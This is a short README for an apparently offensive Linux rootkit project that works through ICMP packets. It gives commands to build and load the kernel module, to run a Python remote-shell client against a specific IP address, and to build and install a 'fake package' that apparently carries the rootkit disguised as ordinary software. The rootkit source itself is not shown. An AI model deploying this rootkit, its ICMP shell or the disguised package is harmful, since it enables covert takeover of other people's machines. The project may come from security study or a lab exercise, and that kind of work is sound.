# Rootkit
Rootkit based on ICMP packages


# Commands

## In 'packets' folder:

### Build and start module:
```
./run.sh
```

### Delete module:
```
./stop.sh
```

### Get prints dynamically:
```
dmesg -w | grep rootkit
```

### Python shell example:
```
sudo python3 ./shell.py 45.11.26.23
```
## In root folder
### Building the fake package:
```
sudo dpkg-deb --root-owner-group --build nice-package_1.2.1_all
```

### Installing the fake package:
```
sudo dpkg -i nice-package_1.2.1_all.deb
```

# Related sources

https://xcellerator.github.io/tags/rootkit/


